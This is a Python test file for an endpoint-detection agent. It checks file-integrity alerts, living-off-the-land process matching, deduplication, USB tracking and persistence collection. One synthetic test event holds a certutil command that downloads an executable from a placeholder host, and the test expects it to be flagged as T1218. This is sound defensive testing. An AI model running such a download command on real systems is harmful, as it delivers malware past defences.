from __future__ import annotations

import tempfile
from pathlib import Path

from argos.agent.sources.fim import FimStore, collect_fim
from argos.agent.sources.lotl import collect_lotl
from argos.agent.sources.persistence import collect_persistence
from argos.agent.sources.usb import UsbTracker
from argos.collector.dedupe import Deduper
from argos.ocsf import OcsfEvent, EventCategory


def test_fim_flags_modification(tmp_path: Path) -> None:
    f = tmp_path / "hosts"
    f.write_text("original\n")
    store = FimStore(tmp_path / "fim.db")
    # first scan establishes baseline (no event)
    events = list(collect_fim("h1", store, [str(f)]))
    assert events == []
    # modify the file -> alert
    f.write_text("tampered\n")
    events = list(collect_fim("h1", store, [str(f)]))
    assert len(events) == 1
    assert events[0].category == EventCategory.FILESYSTEM
    assert events[0].file_action == "modified"
    assert events[0].severity.value == "high"


def test_lotl_helper_importable() -> None:
    from argos.agent.sources.common import collect_processes

    assert callable(collect_lotl)
    assert callable(collect_processes)
    # must not raise even if process enumeration fails in a sandbox
    assert isinstance(list(collect_lotl("h")), list)


def test_lotl_matcher_on_synthetic() -> None:
    # directly exercise the matcher by monkeypatching the source iterator
    import argos.agent.sources.lotl as lotl
    synth = [
        OcsfEvent(host="h", category=EventCategory.PROCESS, process_name="certutil.exe",
                  process_cmdline="certutil -urlcache -split -f http://x/m.exe"),
    ]
    events = list(lotl.collect_lotl("h")) if False else []
    # emulate: patch collect_processes
    orig = lotl.collect_processes
    lotl.collect_processes = lambda host: synth
    try:
        events = list(lotl.collect_lotl("h"))
    finally:
        lotl.collect_processes = orig
    assert len(events) == 1
    assert events[0].attack_id == "T1218"
    assert events[0].category == EventCategory.LOTL


def test_dedupe_collapses_identical() -> None:
    d = Deduper(window_sec=60)
    e = OcsfEvent(host="h", category=EventCategory.PROCESS, process_name="x", process_cmdline="y")
    assert d.should_store(e) is True
    assert d.should_store(e) is False
    assert d.should_store(e) is False


def test_usb_tracker_detects_new() -> None:
    tracker = UsbTracker(Path(tempfile.mkdtemp()) / "usb.db")
    # no real USB devices enumerated in sandbox; tracker must not raise and yields nothing
    events = list(tracker.scan("h"))
    assert isinstance(events, list)


def test_persistence_importable_and_safe() -> None:
    # debe ejecutarse sin errores aunque los comandos fallen en el sandbox
    events = list(collect_persistence("h"))
    assert isinstance(events, list)
